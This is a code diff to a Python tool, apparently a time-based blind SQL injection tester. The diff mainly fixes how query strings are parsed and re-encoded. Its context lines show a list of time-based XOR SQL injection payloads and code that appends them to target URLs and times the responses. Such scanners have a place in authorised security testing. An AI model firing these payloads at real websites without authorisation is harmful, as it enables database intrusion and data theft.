@@ -1,10 +1,12 @@
 import requests
 import argparse
 import time
-from urllib.parse import urljoin, urlparse, urlencode
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode
 from bs4 import BeautifulSoup
 import threading
 import re
+import csv
+import json
 
 TIME_BASED_XOR_PAYLOADS = [
     "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X",
@@ -64,10 +66,10 @@ class TimeBasedSQLiTester:
         try:
             # Parse the base URL
             parsed_url = urlparse(url)
-            query = dict(parsed_url.query.split('&'))
+            query = parse_qs(parsed_url.query)
             # Append the payload as a query parameter
             query['payload'] = payload
-            encoded_query = urlencode(query)
+            encoded_query = urlencode(query, doseq=True)
             full_url = parsed_url._replace(query=encoded_query).geturl()
             
             start_time = time.time()
@@ -155,9 +157,9 @@ class TimeBasedSQLiTester:
 
     def add_params_to_url(self, url, params):
         url_parts = list(urlparse(url))
-        query = dict(parse_qs(url_parts[4]))
+        query = parse_qs(url_parts[4])
         query.update(params)
-        url_parts[4] = '&'.join([f"{key}={quote(value)}" for key, value in query.items()])
+        url_parts[4] = urlencode(query, doseq=True)
         return urljoin(url, url_parts[2] + '?' + url_parts[4])
 
     def display_results(self):
